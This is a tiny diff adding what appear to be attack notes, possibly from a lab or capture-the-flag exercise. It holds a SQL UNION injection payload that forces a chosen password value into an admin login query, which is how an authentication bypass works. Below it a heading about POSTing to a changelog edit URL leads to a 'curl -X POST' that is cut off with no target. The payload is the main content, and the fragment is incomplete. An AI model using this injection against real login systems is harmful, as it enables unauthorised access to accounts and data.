@@ -1,0 +1,7 @@
+### SQL UNION Injection
+
+' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1
+pass for password
+
+###: curl the changelog edit URL
+curl -X POST
